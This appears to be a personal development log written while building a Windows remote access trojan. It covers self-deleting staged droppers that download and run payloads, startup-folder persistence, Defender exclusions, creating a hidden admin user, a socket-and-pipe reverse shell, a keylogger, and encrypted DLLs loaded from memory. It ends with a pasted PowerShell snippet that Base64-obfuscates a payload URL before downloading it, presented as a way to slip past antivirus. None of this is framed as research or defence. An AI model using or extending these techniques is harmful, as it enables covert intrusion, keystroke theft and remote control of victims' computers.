-soo all environment is setup

-both attacker n trget vms are set

-script is set

-now to make it self deleting

-now it deletes itself after execution

-now it makes a stage2.cmd which downloads the payload from the server
    and executes it and then deletes itself and the initial script leaving 
    the payload running on target and inside the startup folder.

-stage 2 can now run scripts (ps1 and cmd)with admin previlages

-now we dont need initial.ps1, make file in temp , exclude from defender scan

-made admin user, got reverse shell via ssh

-server ready to get text file, address issue in upload.ps1


-now select a file to configer,  do ssh [pending!!]

-code for socket programming  use this to compile         |||||  cl /EHsc client.cpp /link ws2_32.lib  ||||||
    try to send back its ip address, should come as 2nd parameter of accept()           [  wont need this ]


- doin research on stdin and out and pipes

-pipes set up , works with cmd prompt , not to make it clean 
    -implement with server and client                                                   [ to do ]


- will need to make 2 sockets and 2 pipes and 2 cmd prompts on both end and connect them.

- now the pipe stuff works, like i get an interactive shell through pipes and will need to all this thing in the server and client code, i think i'll need two
pipes and send data through them.

- ok soo now the shells can communicate over the socket, but now i will need to make a thread to handel the data coming from the server, and in the 
server make threads to read and write to the socket. and it exites after inputting " dir " check y.

-ok soo the reverse shell works now, there is no cmd process opening on the server, server just reads through the stdin and writes to the stdout of the 
target's cmd process. and dir works now,  :)

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!-the server is printing the command again???!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

A very interactive console and target

soo apprently due to defining SOCKET sock = INVALID_SOCKET; in main , i cant use global socket , soo i passed it to the rev_shell();

now to do communication over internt............ will use a php server to do that

soo using php to make a file on the server, and then using the file as a means of communication, need to find a better method
like can i use php to connect multiple clients and send and recieve data between them? without the need of a file?

using file now -_-, send data followed by recieve data doesnt work but via versa works.

soo now the recieve_data reads from the file and puts "`" to the file it read (so now ` represents the file is empty)
(cant do this, will need to send "`" seperately)

now the target behaves as expectedly till the option selection(switch()) , but will need to find out a way to execute stuff on target
communication issues, i need to send 2 data at once, for keystroke injection , but target will only get the 2nd data, so i need to send the 1st data first and then the 2nd data
and thre shoud be some indicator that the clientgot the 1st, ill wait till the client puts ` in the from_server.txt

to make this rev shell work again , will need to make them wait and all :/

reverse shell is working over the internt. :)

added a feature in which the module downloader will send user pc info to the server.

to do-> File upload and download to and from the target

keylogger works, but getting detected, executing hello.vbs??? when stopping the keylogger? huh?

will work on dll rn, soo that my main rat is a .dll

                                                                        TO do

                            work on reflective dll [HOld]
                            Now to make the rat use the dll functions.

                            in this i seperated the modules of the keylogger
                            it is getting detected now :(


                            loaded from memory now to use encrypted .dlls
                            now it doesnot use any files
                            - need to remove all suspicious imports from the dlls too.......... [SetWindowsHookEx, UnhookWindowsHookEx]
                            - need to obsfuscate
                            - encryped dlls
                            -

Obfuscating URL for Download
You plan to host remotely and obfuscate the URL. To make this less detectable, use Base64 encoding or other obfuscation methods to hide the download source.

Example (Base64 Encoding for URL Obfuscation):

powershell
Copy code
# Encode URL
$encodedUrl = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("http://your-url.com/payload.exe"))
$decodedUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedUrl))

# Download using decoded URL
Invoke-WebRequest -Uri $decodedUrl -OutFile "C:\Path\to\downloaded.exe"
This keeps the download URL hidden, making it more challenging for A/V software to detect it as suspicious.                                                    

___________________________________________________________________________________________________________________________________________________________


Exclusion Avoidance:

In addition to exclusions, using multi-layer obfuscation on files and processes can make detection harder.
Pack the files into compressed archives (e.g., zip or exe packers) and then extract them to memory or the folder at runtime.

Now Whole RAT works in memory, just need the loader to run (s3.exe)
